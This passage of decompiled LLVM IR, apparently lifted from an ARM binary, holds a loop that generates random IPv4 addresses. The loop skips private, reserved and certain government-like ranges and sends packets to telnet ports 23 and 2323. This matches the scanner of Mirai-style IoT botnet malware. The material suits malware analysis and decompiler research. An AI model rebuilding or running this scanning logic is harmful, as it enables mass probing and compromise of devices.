  store i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104ec = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_199d8.303 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104fc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([8 x i8]* @global_var_199d8.303 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199e0.305 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1050c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_199e0.305 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199ec.307 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1051c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_199ec.307 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.261 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1052c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_19908.261 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1053c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198ac.239 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1054c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_198ac.239 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198a4.237 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1055c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_198a4.237 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199ac.295 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1056c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_199ac.295 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199f4.309 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1057c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_199f4.309 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198d8.251 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1058c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint ([5 x i8]* @global_var_198d8.251 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19928.267 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1059c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint ([7 x i8]* @global_var_19928.267 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1989c.311 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1989c.311 to i32), i32* %r1.global-to-local, align 4
  %v5_105ac = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_1989c.311 to i32), i32 ptrtoint ([5 x i8]* @global_var_1989c.311 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_199fc.313 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19a04.315 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_105bc = call i32 @function_fe88(i32 ptrtoint ([7 x i8]* @global_var_199fc.313 to i32), i32 ptrtoint ([7 x i8]* @global_var_19a04.315 to i32), i32 1)
  store i32 %v5_105bc, i32* %r0.global-to-local, align 4
  %v2_105c4 = ptrtoint i32* %stack_var_-1866 to i32
  br label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10148
  %stack_var_-1876.0 = phi i32 [ %tmp273, %dec_label_pc_10148 ], [ %stack_var_-1876.2, %dec_label_pc_10d3c ]
  %stack_var_-1884.0 = phi i32 [ %v2_105c4, %dec_label_pc_10148 ], [ %stack_var_-1884.1, %dec_label_pc_10d3c ]
  %stack_var_-1880.0 = phi i16 [ %v4_10134, %dec_label_pc_10148 ], [ %stack_var_-1880.1, %dec_label_pc_10d3c ]
  store i32 ptrtoint (i32* @global_var_22398.194 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_105d4 = load i32, i32* @global_var_22398.194, align 4
  store i32 %v2_105d4, i32* @r5, align 4
  %v3_105d8 = icmp uge i32 %stack_var_-1876.0, %v2_105d4
  store i1 %v3_105d8, i1* %cpsr_c.global-to-local, align 1
  %v9_105d8 = icmp eq i32 %stack_var_-1876.0, %v2_105d4
  store i1 %v9_105d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_105d8, label %dec_label_pc_10858, label %dec_label_pc_105e0

dec_label_pc_105e0:                               ; preds = %dec_label_pc_105cc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_105e4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_105f0

dec_label_pc_105f0:                               ; preds = %dec_label_pc_107b4, %dec_label_pc_105e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_10604 = call i32 @function_f570()
  %v1_10604 = trunc i32 %v0_10604 to i16
  store i32 %v0_10604, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2290c.90 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %ip.global-to-local, align 4
  %v2_10610 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_10610, i32* %r3.global-to-local, align 4
  store i16 %v1_10604, i16* bitcast (i32* @global_var_2236c.211 to i16*), align 4
  store i32 %v2_10610, i32* @global_var_22374.316, align 4
  br label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %dec_label_pc_106f0, %dec_label_pc_1064c, %dec_label_pc_10724, %dec_label_pc_10718, %dec_label_pc_1070c, %dec_label_pc_10700, %.thread29, %bb314, %dec_label_pc_1065c, %bb313, %dec_label_pc_10644, %bb312, %bb329, %bb328, %bb327, %bb326, %bb325, %dec_label_pc_106e8, %dec_label_pc_106e0, %bb321, %dec_label_pc_106b0, %dec_label_pc_1068c, %bb331, %dec_label_pc_105f0
  %v0_1061c = call i32 @function_f570()
  store i32 %v0_1061c, i32* %r0.global-to-local, align 4
  %v1_10620 = urem i32 %v0_1061c, 256
  store i32 %v1_10620, i32* %r1.global-to-local, align 4
  %v3_10624 = udiv i32 %v0_1061c, 256
  store i32 %v3_10624, i32* %r3.global-to-local, align 4
  %v3_10628 = udiv i32 %v0_1061c, 65536
  store i32 %v3_10628, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1062c = icmp eq i32 %v1_10620, 0
  store i1 %v2_1062c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1062c, label %bb312, label %bb311

bb311:                                            ; preds = %dec_label_pc_1061c
  %v3_10630 = icmp ugt i32 %v1_10620, 126
  store i1 %v3_10630, i1* %cpsr_c.global-to-local, align 1
  %v8_10630 = icmp eq i32 %v1_10620, 127
  store i1 %v8_10630, i1* %cpsr_z.global-to-local, align 1
  br label %bb312

bb312:                                            ; preds = %dec_label_pc_1061c, %bb311
  %v0_10640 = phi i1 [ true, %dec_label_pc_1061c ], [ %v8_10630, %bb311 ]
  %v1_10634 = urem i32 %v3_10624, 256
  store i32 %v1_10634, i32* %ip.global-to-local, align 4
  %v1_10638 = urem i32 %v3_10628, 256
  store i32 %v1_10638, i32* %r2.global-to-local, align 4
  %v1_1063c = and i32 %v0_1061c, 8388608
  %v2_1063c = icmp ne i32 %v1_1063c, 0
  store i1 %v2_1063c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10640, label %dec_label_pc_1061c, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %bb312
  %v2_10644 = icmp ugt i32 %v1_10620, 2
  store i1 %v2_10644, i1* %cpsr_c.global-to-local, align 1
  %v7_10644 = icmp eq i32 %v1_10620, 3
  store i1 %v7_10644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10644, label %dec_label_pc_1061c, label %dec_label_pc_1064c

dec_label_pc_1064c:                               ; preds = %dec_label_pc_10644
  %v1_1064c = add nsw i32 %v1_10620, -15
  store i32 %v1_1064c, i32* %r3.global-to-local, align 4
  %v2_10650 = icmp ugt i32 %v1_10620, 55
  store i1 %v2_10650, i1* %cpsr_c.global-to-local, align 1
  %v7_10650 = icmp eq i32 %v1_10620, 56
  store i1 %v7_10650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10650, label %dec_label_pc_1061c, label %bb313

bb313:                                            ; preds = %dec_label_pc_1064c
  %v3_10654 = icmp ne i32 %v1_1064c, 0
  store i1 %v3_10654, i1* %cpsr_c.global-to-local, align 1
  %v8_10654 = icmp eq i32 %v1_1064c, 1
  store i1 %v8_10654, i1* %cpsr_z.global-to-local, align 1
  %v2_10658 = xor i1 %v3_10654, true
  %v3_10658 = or i1 %v8_10654, %v2_10658
  br i1 %v3_10658, label %dec_label_pc_1061c, label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %bb313
  %v2_1065c = icmp ugt i32 %v1_10620, 9
  store i1 %v2_1065c, i1* %cpsr_c.global-to-local, align 1
  %v7_1065c = icmp eq i32 %v1_10620, 10
  store i1 %v7_1065c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1065c, label %dec_label_pc_1061c, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %dec_label_pc_1065c
  %v2_10664 = icmp ugt i32 %v1_10620, 191
  store i1 %v2_10664, i1* %cpsr_c.global-to-local, align 1
  %v7_10664 = icmp eq i32 %v1_10620, 192
  store i1 %v7_10664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10664, label %bb314, label %dec_label_pc_10670

bb314:                                            ; preds = %dec_label_pc_10664
  %v3_10668 = icmp ugt i32 %v1_10634, 167
  store i1 %v3_10668, i1* %cpsr_c.global-to-local, align 1
  %v8_10668 = icmp eq i32 %v1_10634, 168
  store i1 %v8_10668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10668, label %dec_label_pc_1061c, label %dec_label_pc_10670

dec_label_pc_10670:                               ; preds = %dec_label_pc_10664, %bb314
  %v7_10670 = icmp eq i32 %v1_10620, 172
  %.384 = zext i1 %v7_10670 to i32
  store i32 %.384, i32* %r3.global-to-local, align 4
  %v2_1067c = icmp ugt i32 %v1_10634, 14
  store i1 %v2_1067c, i1* %cpsr_c.global-to-local, align 1
  %v7_1067c = icmp eq i32 %v1_10634, 15
  store i1 %v7_1067c, i1* %cpsr_z.global-to-local, align 1
  %v2_10680 = xor i1 %v2_1067c, true
  %v3_10680 = or i1 %v7_1067c, %v2_10680
  br i1 %v3_10680, label %.thread7, label %bb317

.thread7:                                         ; preds = %dec_label_pc_10670
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10694

bb317:                                            ; preds = %dec_label_pc_10670
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10684 = icmp eq i1 %v7_10670, false
  store i1 %v2_10684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10684, label %dec_label_pc_10694, label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %bb317
  %v2_1068c = icmp ugt i32 %v1_10634, 30
  store i1 %v2_1068c, i1* %cpsr_c.global-to-local, align 1
  %v7_1068c = icmp eq i32 %v1_10634, 31
  store i1 %v7_1068c, i1* %cpsr_z.global-to-local, align 1
  %v2_10690 = xor i1 %v2_1068c, true
  %v3_10690 = or i1 %v7_1068c, %v2_10690
  br i1 %v3_10690, label %dec_label_pc_1061c, label %dec_label_pc_10694

dec_label_pc_10694:                               ; preds = %.thread7, %dec_label_pc_1068c, %bb317
  %v7_10694 = icmp eq i32 %v1_10620, 100
  %.385 = zext i1 %v7_10694 to i32
  store i32 %.385, i32* %r3.global-to-local, align 4
  %v2_106a0 = icmp ugt i32 %v1_10634, 62
  store i1 %v2_106a0, i1* %cpsr_c.global-to-local, align 1
  %v7_106a0 = icmp eq i32 %v1_10634, 63
  store i1 %v7_106a0, i1* %cpsr_z.global-to-local, align 1
  %v2_106a4 = xor i1 %v2_106a0, true
  %v3_106a4 = or i1 %v7_106a0, %v2_106a4
  br i1 %v3_106a4, label %.thread12, label %bb320

.thread12:                                        ; preds = %dec_label_pc_10694
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_106b8

bb320:                                            ; preds = %dec_label_pc_10694
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106a8 = icmp eq i1 %v7_10694, false
  store i1 %v2_106a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106a8, label %dec_label_pc_106b8, label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %bb320
  %v2_106b0 = icmp ugt i32 %v1_10634, 125
  store i1 %v2_106b0, i1* %cpsr_c.global-to-local, align 1
  %v7_106b0 = icmp eq i32 %v1_10634, 126
  store i1 %v7_106b0, i1* %cpsr_z.global-to-local, align 1
  %v2_106b4 = xor i1 %v2_106b0, true
  %v3_106b4 = or i1 %v7_106b0, %v2_106b4
  br i1 %v3_106b4, label %dec_label_pc_1061c, label %dec_label_pc_106b8

dec_label_pc_106b8:                               ; preds = %.thread12, %dec_label_pc_106b0, %bb320
  %v2_106b8 = icmp ugt i32 %v1_10620, 168
  store i1 %v2_106b8, i1* %cpsr_c.global-to-local, align 1
  %v7_106b8 = icmp eq i32 %v1_10620, 169
  store i1 %v7_106b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106b8, label %bb321, label %dec_label_pc_106c4

bb321:                                            ; preds = %dec_label_pc_106b8
  %v3_106bc = icmp eq i32 %v1_10634, 255
  store i1 %v3_106bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_106bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_106bc, label %dec_label_pc_1061c, label %dec_label_pc_106c4

dec_label_pc_106c4:                               ; preds = %dec_label_pc_106b8, %bb321
  %v7_106c4 = icmp eq i32 %v1_10620, 198
  %.386 = zext i1 %v7_106c4 to i32
  store i32 %.386, i32* %r3.global-to-local, align 4
  %v2_106d0 = icmp ugt i32 %v1_10634, 16
  store i1 %v2_106d0, i1* %cpsr_c.global-to-local, align 1
  %v7_106d0 = icmp eq i32 %v1_10634, 17
  store i1 %v7_106d0, i1* %cpsr_z.global-to-local, align 1
  %v2_106d4 = xor i1 %v2_106d0, true
  %v3_106d4 = or i1 %v7_106d0, %v2_106d4
  br i1 %v3_106d4, label %.thread18, label %bb324

.thread18:                                        ; preds = %dec_label_pc_106c4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_106e8

bb324:                                            ; preds = %dec_label_pc_106c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106d8 = icmp eq i1 %v7_106c4, false
  store i1 %v2_106d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106d8, label %dec_label_pc_106e8, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %bb324
  %v2_106e0 = icmp ugt i32 %v1_10634, 18
  store i1 %v2_106e0, i1* %cpsr_c.global-to-local, align 1
  %v7_106e0 = icmp eq i32 %v1_10634, 19
  store i1 %v7_106e0, i1* %cpsr_z.global-to-local, align 1
  %v2_106e4 = xor i1 %v2_106e0, true
  %v3_106e4 = or i1 %v7_106e0, %v2_106e4
  br i1 %v3_106e4, label %dec_label_pc_1061c, label %dec_label_pc_106e8

dec_label_pc_106e8:                               ; preds = %.thread18, %dec_label_pc_106e0, %bb324
  %v2_106e8 = icmp ugt i32 %v1_10620, 222
  store i1 %v2_106e8, i1* %cpsr_c.global-to-local, align 1
  %v7_106e8 = icmp eq i32 %v1_10620, 223
  store i1 %v7_106e8, i1* %cpsr_z.global-to-local, align 1
  %v2_106ec = xor i1 %v7_106e8, true
  %v3_106ec = and i1 %v2_106e8, %v2_106ec
  br i1 %v3_106ec, label %dec_label_pc_1061c, label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106e8
  %v1_106f0 = add nsw i32 %v1_10620, -6
  store i32 %v1_106f0, i32* %r3.global-to-local, align 4
  %v2_106f4 = icmp ugt i32 %v1_10620, 10
  store i1 %v2_106f4, i1* %cpsr_c.global-to-local, align 1
  %v7_106f4 = icmp eq i32 %v1_10620, 11
  store i1 %v7_106f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106f4, label %dec_label_pc_1061c, label %bb325

bb325:                                            ; preds = %dec_label_pc_106f0
  %v3_106f8 = icmp ne i32 %v1_106f0, 0
  store i1 %v3_106f8, i1* %cpsr_c.global-to-local, align 1
  %v8_106f8 = icmp eq i32 %v1_106f0, 1
  store i1 %v8_106f8, i1* %cpsr_z.global-to-local, align 1
  %v2_106fc = xor i1 %v3_106f8, true
  %v3_106fc = or i1 %v8_106f8, %v2_106fc
  br i1 %v3_106fc, label %dec_label_pc_1061c, label %dec_label_pc_10700

dec_label_pc_10700:                               ; preds = %bb325
  %v2_10700 = icmp ugt i32 %v1_10620, 21
  store i1 %v2_10700, i1* %cpsr_c.global-to-local, align 1
  %v7_10700 = icmp eq i32 %v1_10620, 22
  store i1 %v7_10700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10700, label %dec_label_pc_1061c, label %bb326

bb326:                                            ; preds = %dec_label_pc_10700
  %v3_10704 = icmp ugt i32 %v1_10620, 20
  store i1 %v3_10704, i1* %cpsr_c.global-to-local, align 1
  %v8_10704 = icmp eq i32 %v1_10620, 21
  store i1 %v8_10704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10704, label %dec_label_pc_1061c, label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %bb326
  %v2_1070c = icmp ugt i32 %v1_10620, 27
  store i1 %v2_1070c, i1* %cpsr_c.global-to-local, align 1
  %v7_1070c = icmp eq i32 %v1_10620, 28
  store i1 %v7_1070c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1070c, label %dec_label_pc_1061c, label %bb327

bb327:                                            ; preds = %dec_label_pc_1070c
  %v3_10710 = icmp ugt i32 %v1_10620, 25
  store i1 %v3_10710, i1* %cpsr_c.global-to-local, align 1
  %v8_10710 = icmp eq i32 %v1_10620, 26
  store i1 %v8_10710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10710, label %dec_label_pc_1061c, label %dec_label_pc_10718

dec_label_pc_10718:                               ; preds = %bb327
  %v2_10718 = icmp ugt i32 %v1_10620, 29
  store i1 %v2_10718, i1* %cpsr_c.global-to-local, align 1
  %v7_10718 = icmp eq i32 %v1_10620, 30
  store i1 %v7_10718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10718, label %dec_label_pc_1061c, label %bb328

bb328:                                            ; preds = %dec_label_pc_10718
  %v3_1071c = icmp ugt i32 %v1_10620, 28
  store i1 %v3_1071c, i1* %cpsr_c.global-to-local, align 1
  %v8_1071c = icmp eq i32 %v1_10620, 29
  store i1 %v8_1071c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1071c, label %dec_label_pc_1061c, label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %bb328
  %v2_10724 = icmp ugt i32 %v1_10620, 54
  store i1 %v2_10724, i1* %cpsr_c.global-to-local, align 1
  %v7_10724 = icmp eq i32 %v1_10620, 55
  store i1 %v7_10724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10724, label %dec_label_pc_1061c, label %bb329

bb329:                                            ; preds = %dec_label_pc_10724
  %v3_10728 = icmp ugt i32 %v1_10620, 32
  store i1 %v3_10728, i1* %cpsr_c.global-to-local, align 1
  %v8_10728 = icmp eq i32 %v1_10620, 33
  store i1 %v8_10728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10728, label %dec_label_pc_1061c, label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %bb329
  %v2_10730 = icmp ugt i32 %v1_10620, 214
  store i1 %v2_10730, i1* %cpsr_c.global-to-local, align 1
  %v7_10730 = icmp eq i32 %v1_10620, 215
  store i1 %v7_10730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10730, label %.thread29, label %bb330

bb330:                                            ; preds = %dec_label_pc_10730
  %v3_10734 = icmp ugt i32 %v1_10620, 213
  store i1 %v3_10734, i1* %cpsr_c.global-to-local, align 1
  %v8_10734 = icmp eq i32 %v1_10620, 214
  store i1 %v8_10734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10734, label %bb331, label %dec_label_pc_10744

.thread29:                                        ; preds = %dec_label_pc_10730
  br label %dec_label_pc_1061c

bb331:                                            ; preds = %bb330
  br label %dec_label_pc_1061c

dec_label_pc_10744:                               ; preds = %bb330
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v5_10750 = call i32 @llvm.bswap.i32(i32 %v0_1061c)
  store i32 %v5_10750, i32* %r0.global-to-local, align 4
  %v1_10754 = call i32 @function_14828(i32 %v5_10750)
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v1_10754, i32* @global_var_22378.317, align 4
  %v0_10764 = load i32, i32* @r4, align 4
  %v1_10764 = trunc i32 %v0_10764 to i16
  store i16 %v1_10764, i16* bitcast (i32* @global_var_22372.318 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* @r0, align 4
  %v3_1076c = call i32 @function_dadc(i32 ptrtoint (i8** @global_var_22368.209 to i32), i32 20)
  %v4_1076c = trunc i32 %v3_1076c to i16
  store i32 %v3_1076c, i32* %r0.global-to-local, align 4
  %v3_10770 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10770, i32* %r1.global-to-local, align 4
  %v5_10780 = sdiv i32 %v3_10770, 10
  %v3_10784 = mul i32 %v5_10780, 8
  store i32 %v3_10784, i32* %r2.global-to-local, align 4
  %v2_1078c = mul i32 %v5_10780, 10
  store i32 %v2_1078c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %ip.global-to-local, align 4
  %v3_10794 = icmp uge i32 %v3_10770, %v2_1078c
  store i1 %v3_10794, i1* %cpsr_c.global-to-local, align 1
  %v9_10794 = icmp eq i32 %v3_10770, %v2_1078c
  store i1 %v9_10794, i1* %cpsr_z.global-to-local, align 1
  store i16 %v4_1076c, i16* bitcast (i32* @global_var_22372.318 to i16*), align 4
  br i1 %v9_10794, label %dec_label_pc_107a0, label %dec_label_pc_10b4c

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10744
  store i32 2323, i32* %r0.global-to-local, align 4
  %v1_107a8 = call i32 @function_1484c(i32 2323)
  %v2_107a8 = trunc i32 %v1_107a8 to i16
  store i32 %v1_107a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10b4c, %dec_label_pc_107a0
  %storemerge = phi i16 [ %v2_107a8, %dec_label_pc_107a0 ], [ %v2_10b50, %dec_label_pc_10b4c ]
  store i16 %storemerge, i16* @global_var_2237e.217, align 2
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32* %ip.global-to-local, align 4
  %v3_107bc = load i32, i32* @global_var_22378.317, align 4
  store i32 %v3_107bc, i32* %r3.global-to-local, align 4
  store i32 %v3_107bc, i32* @global_var_22380.320, align 4
  store i16 0, i16* bitcast (i32* @global_var_2238c.321 to i16*), align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_107d0 = call i32 @function_1484c(i32 20)
  store i32 %v1_107d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32* @r1, align 4
  %v5_107e4 = call i32 @function_db2c(i32 ptrtoint (i8** @global_var_22368.209 to i32), i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32 %v1_107d0, i32 20)
  %v6_107e4 = trunc i32 %v5_107e4 to i16
  store i16 %v6_107e4, i16* bitcast (i32* @global_var_2238c.321 to i16*), align 4
  %v2_10800 = load i32, i32* @global_var_2292c.207, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_1081c = load i16, i16* @global_var_2237e.217, align 2
  %v4_1081c = zext i16 %v3_1081c to i32
  store i32 %v4_1081c, i32* %ip.global-to-local, align 4
  store i32 %v2_105e4, i32* @lr, align 4
  store i32 %v2_10800, i32* @r0, align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v0_1083c = call i32 @function_14a98()
  store i32 %v0_1083c, i32* %r0.global-to-local, align 4
  %v3_10840 = load i32, i32* %stack_var_-52, align 4
  %v1_10844 = add i32 %v3_10840, 1
  store i32 %v1_10844, i32* %r3.global-to-local, align 4
  %v3_10848 = icmp ugt i32 %v1_10844, 383
  store i1 %v3_10848, i1* %cpsr_c.global-to-local, align 1
  %v8_10848 = icmp eq i32 %v1_10844, 384
  store i1 %v8_10848, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10844, i32* %stack_var_-52, align 4
  %v5_10850 = icmp slt i32 %v1_10844, 384
  br i1 %v5_10850, label %dec_label_pc_105f0, label %dec_label_pc_10854

dec_label_pc_10854:                               ; preds = %dec_label_pc_107b4
  %v0_10854 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_105cc, %dec_label_pc_10854
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_105cc ], [ %v0_10854, %dec_label_pc_10854 ]
  store i32 %stack_var_-1884.0, i32* @lr, align 4
  store i32 0, i32* @r6, align 4
  %v1_10860 = add i32 %stack_var_-1884.0, 20
  store i32 %v1_10860, i32* @r5, align 4
  %v1_108cc = add i32 %stack_var_-1884.0, 16
  %v2_108cc = inttoptr i32 %v1_108cc to i32*
  %v1_108e0 = add i32 %stack_var_-1884.0, 9
  %v2_108e0 = inttoptr i32 %v1_108e0 to i8*
  %v4_1091c = sext i16 %stack_var_-1880.0 to i32
  %v1_10960 = add i32 %stack_var_-1884.0, 12
  %v2_10960 = inttoptr i32 %v1_10960 to i32*
  br label %dec_label_pc_10864

dec_label_pc_10864:                               ; preds = %dec_label_pc_1094c, %dec_label_pc_10944, %dec_label_pc_1093c, %dec_label_pc_10918, %dec_label_pc_10900, %dec_label_pc_108dc, %dec_label_pc_108c4, %dec_label_pc_10934, %dec_label_pc_10928, %dec_label_pc_108bc, %dec_label_pc_109dc, %dec_label_pc_10858
  %v0_10864 = call i32 @function_12ecc()
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_1086c = inttoptr i32 %v0_10864 to i32*
